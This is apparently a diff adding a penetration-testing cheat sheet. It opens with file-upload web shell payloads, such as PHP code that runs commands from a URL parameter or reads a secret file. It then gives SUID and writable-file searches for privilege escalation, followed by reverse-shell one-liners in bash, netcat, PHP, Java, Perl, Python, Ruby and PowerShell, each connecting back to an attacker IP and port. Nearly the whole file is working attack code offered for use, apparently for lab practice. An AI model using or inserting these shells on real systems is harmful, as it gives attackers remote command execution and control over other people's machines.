@@ -1,0 +1,91 @@
+        >>> File upload vulnerabilities <<<
+
+<?php echo file_get_contents('/path/to/target/file'); ?>
+<?php echo system($_GET['command']); ?>
+GET /example/exploit.php?command=id HTTP/1.1
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+<?php system($_GET['cmd']); ?>
+
+<staticContent>
+    <mimeMap fileExtension=".json" mimeType="application/json" />
+</staticContent>
+
+
+>> Reverse Shell
+================
+bash -i >& /dev/tcp/<your-ip>/<port> 0>&1 	                    Reverse shell via bash
+nc -e /bin/sh <your-ip> <port> 	                                Reverse shell via Netcat
+find / -perm -4000 -type f 2>/dev/null 	                        Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)
+find / -writable -type  f 2>/dev/null | grep -v "/proc/" 	    Also helpful in privilege escalation attempts used to find files with writable permissions
+
+Reverse shell examples
+
+Creating a reverse shell is very simple, and you can use a variety of tools and languages to do it. First, you need a listener on your local machine with a public IP. For example, on a Linux machine, all you need is the following netcat command:
+
+ncat -l -p 1337
+
+This establishes the listener on TCP port 1337. Let’s assume the user’s machine is available at the IP address 10.10.17.1. Here’s a selection of one-liners that you can execute on the compromised target machine to create a reverse shell connection with the attacker’s machine.
+Bash reverse shell
+
+The simplest method is to use bash, which is available on almost all Linux machines. This script was tested on Ubuntu 18.04, but not all versions of bash support this function:
+
+/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
+PHP reverse shell
+
+If the target machine is a web server that supports PHP, this language will be an excellent choice for a reverse shell:
+
+php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+If this does not work, you can try replacing &3 with consecutive file descriptors. Another option for PHP is to download and execute a more complex script developed by pentestmonkey.
+Java reverse shell
+
+If the target machine uses Java, try the following simple example:
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;
+cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+Perl reverse shell
+
+Perl is another good candidate for a reverse shell on a web server:
+
+perl -e 'use Socket;$i="10.10.17.1";$p=1337;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
+open(STDOUT,">&S");open(STDERR,">&S");
+exec("/bin/sh -i");};'
+Python reverse shell
+
+Python is commonly used on production systems, so it may be another option for a reverse shell:
+
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.17.1",1337));
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+Ruby reverse shell
+
+While Ruby is not as common as the other languages, it also makes it possible to create a reverse shell:
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337");
+while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
+
+or
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i;
+exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+Netcat reverse shell
+
+Netcat is rarely available on production servers, but if all else fails, the attacker can try the following:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
+Powershell reverse shell
+
+On Windows machines, you can even create a reverse shell using Powershell. Here’s an example developed by Nikhil SamratAshok Mittal.
+
+$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();
+[byte[]]$bt=0..255|%{0};
+while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
+$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
+$sm.Write($st,0,$st.Length)}
